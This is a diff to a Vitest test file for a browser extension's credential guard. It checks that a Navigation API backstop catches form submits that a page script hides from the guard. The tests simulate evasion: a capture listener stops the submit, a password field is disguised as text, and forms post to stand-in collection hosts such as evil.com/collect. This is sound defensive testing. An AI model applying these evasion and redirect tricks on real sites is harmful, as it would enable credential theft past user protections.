@@ -1,6 +1,21 @@
 // @vitest-environment happy-dom
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
+// #1113: happy-dom has no Navigation API. Install a stub before the guard loads,
+// and record the guard's window submit listener so a test can put a page
+// listener ahead of it, as document.open() plus a written script does.
+const nav = vi.hoisted(() => {
+  const navigation = new EventTarget();
+  (window as unknown as { navigation: EventTarget }).navigation = navigation;
+  const guardSubmit: EventListener[] = [];
+  const original = window.addEventListener;
+  window.addEventListener = ((type: string, listener: EventListener, options?: boolean) => {
+    if (type === "submit") guardSubmit.push(listener);
+    original.call(window, type, listener, options);
+  }) as typeof window.addEventListener;
+  return { navigation, guardSubmit, restore: () => { window.addEventListener = original; } };
+});
+
 vi.mock("../extension/src/shared/storage", () => ({
   getCredentialSettings: vi.fn(),
   getTrustedDomains: vi.fn(),
@@ -211,6 +226,7 @@ function defaultConfig() {
 
 // Import module under test — registers event listeners on document
 import "../extension/src/content/credential_guard";
+nav.restore();
 
 // The guard registers a settings-change subscription at module load to keep its
 // synchronous credential-mode cache fresh (#227.5). Capture that callback now
@@ -2073,6 +2089,121 @@ describe("credential_guard", () => {
 
       expect(stopSpy).toHaveBeenCalledTimes(1);
       expect(mockShowModal).toHaveBeenCalledTimes(2);
+    });
+
+    // #1113: after document.open(), a written script's window capture listener is
+    // added before the guard is re-added and can stop the submit unseen. The guard's
+    // Navigation API listener is not erased, so it still runs first.
+    describe("navigate backstop (#1113)", () => {
+      function navigate(sourceElement: Element, url: string, userInitiated: boolean): Event {
+        const ev = new Event("navigate", { cancelable: true });
+        Object.defineProperties(ev, {
+          sourceElement: { value: sourceElement },
+          userInitiated: { value: userInitiated },
+          destination: { value: { url } },
+        });
+        nav.navigation.dispatchEvent(ev);
+        return ev;
+      }
+
+      it("assesses a user submit that a page capture listener stopped ahead of the guard", async () => {
+        const { form, btn } = formWithButton();
+        btn.setAttribute("formaction", "https://evil.com/collect");
+        const [guard] = nav.guardSubmit;
+        const hide = (e: Event): void => e.stopImmediatePropagation();
+        // document.open() erases the guard; the written script adds `hide`; the guard is re-added behind it.
+        window.removeEventListener("submit", guard!, true);
+        window.addEventListener("submit", hide, true);
+        window.addEventListener("submit", guard!, true);
+        try {
+          const submit = await dispatchSubmit(form, btn);
+          expect(submit.defaultPrevented).toBe(false); // the guard never saw it
+          expect(mockShowModal).not.toHaveBeenCalled();
+
+          const ev = navigate(btn, "https://evil.com/collect", true);
+          await flushMicrotasks();
+
+          expect(ev.defaultPrevented).toBe(true);
+          expect(mockComputeRisk).toHaveBeenCalledWith(expect.objectContaining({ actionUrl: "https://evil.com/collect" }));
+          expect(mockShowModal).toHaveBeenCalledTimes(1);
+        } finally {
+          window.removeEventListener("submit", hide, true);
+        }
+      });
+
+      it("lets a resumed submission keep its approved destination", async () => {
+        mockShowModal.mockResolvedValue("proceed_once");
+        const { form, btn } = formWithButton();
+        await dispatchSubmit(form, btn);
+
+        const ev = navigate(btn, "https://example.com/session", false);
+        await flushMicrotasks();
+
+        expect(ev.defaultPrevented).toBe(false);
+        expect(mockShowModal).toHaveBeenCalledTimes(1);
+      });
+
+      it("cancels and re-assesses a resumed submission whose destination moved unseen", async () => {
+        mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+        const { form, btn } = formWithButton();
+        await dispatchSubmit(form, btn);
+        btn.setAttribute("formaction", "https://attacker.test/collect");
+
+        const ev = navigate(btn, "https://attacker.test/collect", false);
+        await flushMicrotasks();
+
+        expect(ev.defaultPrevented).toBe(true);
+        expect(mockShowModal).toHaveBeenCalledTimes(2);
+      });
+
+      it("before any rewrite, leaves unseen non-password form navigations alone (shadow-root forms)", async () => {
+        const plain = createPlainForm();
+        expect(navigate(plain, "https://example.com/search", true).defaultPrevented).toBe(false);
+      });
+
+      it("fails closed when the page hides the password field or moves the submitter after a stopped submit", async () => {
+        // document.open() removes the old root; the shared observer records the rewrite.
+        const root = document.documentElement;
+        document.removeChild(root);
+        document.appendChild(root);
+        await flushMicrotasks();
+        const { form, btn } = formWithButton();
+        const [guard] = nav.guardSubmit;
+        const pw = form.querySelector('input[type="password"]') as HTMLInputElement;
+        // The written listener stops the submit, then makes the form look password-free.
+        const hide = (e: Event): void => {
+          e.stopImmediatePropagation();
+          pw.type = "text";
+        };
+        window.removeEventListener("submit", guard!, true);
+        window.addEventListener("submit", hide, true);
+        window.addEventListener("submit", guard!, true);
+        try {
+          await dispatchSubmit(form, btn);
+          expect(navigate(btn, "https://evil.com/collect", true).defaultPrevented).toBe(true);
+          pw.type = "password";
+          await dispatchSubmit(form, btn);
+          btn.remove(); // a detached submitter has form === null
+          expect(navigate(btn, "https://evil.com/collect", true).defaultPrevented).toBe(true);
+        } finally {
+          window.removeEventListener("submit", hide, true);
+        }
+      });
+
+      it("lets through forms whose submit the guard saw, script navigations it never resumed, and the off mode", async () => {
+        const { btn } = formWithButton();
+        const plain = createPlainForm();
+        expect(navigate(btn, "https://example.com/session", false).defaultPrevented).toBe(false);
+        // A trusted submit the guard let through (happy-dom events are untrusted, so mark it).
+        const seenSubmit = new SubmitEvent("submit", { bubbles: true, cancelable: true });
+        Object.defineProperty(seenSubmit, "isTrusted", { value: true });
+        plain.dispatchEvent(seenSubmit);
+        expect(navigate(plain, "https://evil.com/collect", true).defaultPrevented).toBe(false);
+        setCachedCredMode("off");
+        expect(navigate(btn, "https://evil.com/collect", true).defaultPrevented).toBe(false);
+        await flushMicrotasks();
+        expect(mockShowModal).not.toHaveBeenCalled();
+      });
     });
   });
 });
